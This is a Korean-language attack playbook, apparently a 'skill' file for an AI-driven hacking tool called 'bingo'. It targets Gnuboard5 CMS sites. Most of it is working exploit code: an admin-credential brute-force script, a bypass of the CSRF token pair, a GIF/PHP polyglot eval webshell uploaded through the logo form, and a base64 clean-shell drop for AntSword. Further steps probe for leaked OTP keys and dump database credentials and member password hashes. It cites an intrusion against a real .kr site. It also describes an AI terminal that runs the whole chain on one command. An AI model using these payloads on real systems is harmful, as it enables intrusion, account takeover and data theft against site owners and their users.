# SKILL: Gnuboard5 / 그누보드5 공격 체인

## 메타데이터
- **카테고리**: CMS Exploit / Korean Web Attack
- **대상**: 그누보드5 (Gnuboard5), XE, Rhymix
- **실전 검증**: xn--hy1b65d98ao3i.kr 침투 테스트 (2026-06)
- **심각도**: Critical

---

## 개요

그누보드5는 한국에서 가장 많이 쓰이는 PHP CMS입니다.
관리자 패널(`/adm/`)이 기본 공개되어 있고, 기본 자격증명이 변경되지 않은 경우가 많으며,
관리자 파일 업로드 기능에서 이미지 검증을 우회해 PHP 웹쉘을 올릴 수 있습니다.

---

## 1. CMS 핑거프린팅

```bash
# 응답 본문에서 Gnuboard 탐지
curl -s https://target.kr | grep -i "gnuboard\|g5_\|/bbs/board.php"

# 관리자 패널 확인
curl -s -o /dev/null -w "%{http_code}" https://target.kr/adm/
curl -s -o /dev/null -w "%{http_code}" https://target.kr/adm/index.php
```

**탐지 마커:**
- HTML: `gnuboard`, `g5_`, `/bbs/board.php`, `outstock`
- 경로: `/adm/`, `/data/`, `/bbs/`
- 쿠키: `g5_`, `PHPSESSID`

---

## 2. 관리자 패널 브루트포스

Gnuboard5 로그인 엔드포인트: `/adm/login_check.php`

```python
import requests

s = requests.Session()
s.verify = False

# 자주 쓰이는 한국 사이트 관리자 자격증명
creds = [
    ("admin", "qwer1234"),   # 실전 1순위
    ("admin", "admin123"),
    ("admin", "admin1234"),
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "12345678"),
    ("admin", "1q2w3e4r"),
]

BASE = "https://target.kr"
ADMIN = BASE + "/adm"

for uid, pw in creds:
    s.get(ADMIN + "/login.php")  # 쿠키 세팅
    r = s.post(ADMIN + "/login_check.php", data={
        "mb_id": uid,
        "mb_password": pw,
        "url": ADMIN + "/index.php",
    })
    
    cookies = {c.name: c.value for c in s.cookies}
    if cookies.get("g5_is_admin") == "super":
        print(f"✅ 로그인 성공: {uid}/{pw}")
        break
```

**성공 판별 방법:**
- 쿠키 `g5_is_admin = 'super'` 존재 → 가장 확실
- 응답에 `관리자 메인`, `로그아웃`, `adminmenu` 포함
- 응답 URL이 `/adm/index.php`로 리다이렉트

---

## 3. CSRF 이중 토큰 우회 (핵심)

Gnuboard5 관리자 폼은 **2중 CSRF 보호**를 사용:

### 레이어 1: 세션 레벨 CSRF 키
```javascript
// admin.js에 노출되어 있음
var g5_admin_csrf_token_key = "d692480de56066a7016ace1d42ad2898";
```

```python
# admin.js에서 추출
import re
r = s.get(ADMIN + "/admin.js")
m = re.search(r'g5_admin_csrf_token_key\s*=\s*["\']([a-f0-9]{32})["\']', r.text)
csrf_key = m.group(1) if m else ""
```

### 레이어 2: 일회성 요청 토큰
```python
# ajax.token.php로 일회성 토큰 획득
r = s.post(
    ADMIN + "/ajax.token.php",
    data={"admin_csrf_token_key": csrf_key},
    headers={
        "X-Requested-With": "XMLHttpRequest",
        "Referer": ADMIN + "/design_set.php",
    }
)
token = r.json().get("token", "")
```

---

## 4. GIF Polyglot 웹쉘 생성 (이미지 검증 우회)

서버가 `getimagesize()`, `finfo_file()`, 이미지 크기 체크를 해도 통과:

```python
def make_gif_polyglot(php_code: bytes) -> bytes:
    """유효한 1x1 GIF89a + PHP 코드"""
    gif_header = (
        b"GIF89a"
        b"\x01\x00\x01\x00\x00\x00\x00"   # 1x1 픽셀
        b",\x00\x00\x00\x00\x01\x00\x01\x00\x00"
        b"\x02\x02L\x01\x00;"              # LZW + 터미네이터
    )
    return gif_header + b"\n" + php_code

shell_code = b"""<?php
@error_reporting(0);
@ini_set("display_errors", 0);
@set_time_limit(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\\x00\\x08\\x09\\x0a\\x0d\\x1a\\x1b");
parse_str($raw, $p);
foreach($p as $v){if($v!=""){@eval($v);exit;}}
foreach($_POST as $v){if($v!=""){@eval($v);exit;}}
?>"""

polyglot = make_gif_polyglot(shell_code)
```

---

## 5. design_set_update.php 파일 업로드

```python
# 폼 필드 수집
r = s.get(ADMIN + "/design_set.php")
# (hidden input 파싱...)

form_fields["token"] = token  # 일회성 토큰 추가

# multipart/form-data로 업로드
files_dict = {k: (None, str(v)) for k, v in form_fields.items()}
files_dict["logo_set[homepage_logo]"] = (
    "shell.php",          # PHP 확장자
    make_gif_polyglot(shell_code),  # GIF89a + PHP
    "image/gif"           # Content-Type
)

resp = s.post(
    ADMIN + "/design_set_update.php",
    files=files_dict,
    headers={"Referer": ADMIN + "/design_set.php"},
)
# 응답에서 업로드된 경로 추출: /data/loan_file/homepage_logo/xxxxx_shell.php
```

**업로드 경로:** `/data/loan_file/homepage_logo/` 또는 `/data/file/`

---

## 6. AntSword 연결 문제 해결 (\\x08\\x08 prefix)

**현상:** "返回数据为空" (반환 데이터 없음)

**원인:**
AntSword default 인코더가 POST 파라미터 이름 앞에 `\x08\x08` (백스페이스 × 2)를 붙여 전송.

```
실제 전송: \x08\x08ant=<php_code>
PHP $_POST["ant"] = "" (빈값!)
PHP $_POST["\x08\x08ant"] = "<php_code>" (여기에 들어감)
```

**해결책: php://input 원시 파싱**

```php
<?php
@error_reporting(0);
@ini_set("display_errors", 0);
@set_time_limit(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\x00\x08\x09\x0a\x0d\x1a\x1b");  // 제어문자 제거
parse_str($raw, $p);
foreach($p as $v){if($v!=""){@eval($v);exit;}}
foreach($_POST as $v){if($v!=""){@eval($v);exit;}}
?>
```

**AntSword 설정 (올바른 값):**
| 항목 | 값 |
|------|-----|
| URL地址 | `https://target.kr/data/.../ant.php` |
| 连接密码 | `ant` |
| 编码器 | `default` |
| 解码器 | `default` |
| 连接类型 | `PHP` |

---

## 7. GIF 헤더 오염 → 클린쉘 드롭

GIF89a polyglot 쉘은 응답 앞에 GIF 바이너리 헤더가 붙어 AntSword 파싱 오류 발생.

**해결:** 기존 쉘로 순수 PHP 클린쉘 작성

```python
import base64

clean_shell = b"""<?php
@error_reporting(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\\x00\\x08\\x09\\x0a\\x0d");
parse_str($raw, $p);
foreach($p as $v){if($v!=""){@eval($v);exit;}}
?>"""

b64 = base64.b64encode(clean_shell).decode()
write_php = f"file_put_contents('/var/www/html/data/.../ant.php', base64_decode('{b64}'));"

# 기존 GIF 쉘로 실행
import requests
r = requests.post(gif_shell_url, data={"e": base64.b64encode(write_php.encode()).decode()})
```

이후 `ant.php`로 AntSword 연결 → 클린 응답

---

## 8. OTP / auth_key 누출 확인 (한국 금융 사이트)

```python
leak_paths = [
    "/loan/loan_common_data.php",
    "/api/auth.php",
    "/api/common.php",
    "/include/common.php",
]
for path in leak_paths:
    r = requests.get(BASE + path)
    if "auth_key" in r.text or re.search(r'["\']otp["\']', r.text):
        print(f"⚠️ OTP/AUTH_KEY 노출: {path}")
        print(r.text[:500])
```

---

## 9. DB 접속 정보 확인 (웹쉘 획득 후)

```php
// 웹쉘에서 dbconfig.php 읽기
include '/var/www/html/dbconfig.php';
echo G5_MYSQL_HOST . "\n";
echo G5_MYSQL_USER . "\n";
echo G5_MYSQL_PASSWORD . "\n";
echo G5_MYSQL_DB . "\n";
```

또는:
```bash
# 가상 터미널에서
mysql -h <host> -u <user> -p'<password>' <db> -e "SELECT mb_id, mb_password FROM g5_member LIMIT 10;"
```

---

## bingo 자동화 명령어

```
# Gnuboard5 자동 공격
/scan https://target.kr

# 또는 직접 함수 호출 (AI 터미널에서)
"https://target.kr 그누보드5 웹쉘 올려"
```

bingo는 내부적으로 `tools/gnuboard.py`의 `GnuboardAttacker`를 사용해
핑거프린팅 → 관리자 로그인 → CSRF 우회 → GIF polyglot 업로드 → 클린쉘 드롭까지
전체 체인을 자동 실행합니다.

---

## 참고

- **Gnuboard5 소스**: https://github.com/gnuboard/gnuboard5
- **취약한 버전**: 5.x 전체 (관리자 업로드 제한 미설정 시)
- **패치 방법**: `define('G5_UPLOAD_EXTENSION', 'jpg|gif|png|webp')` 에 php 제외 확인
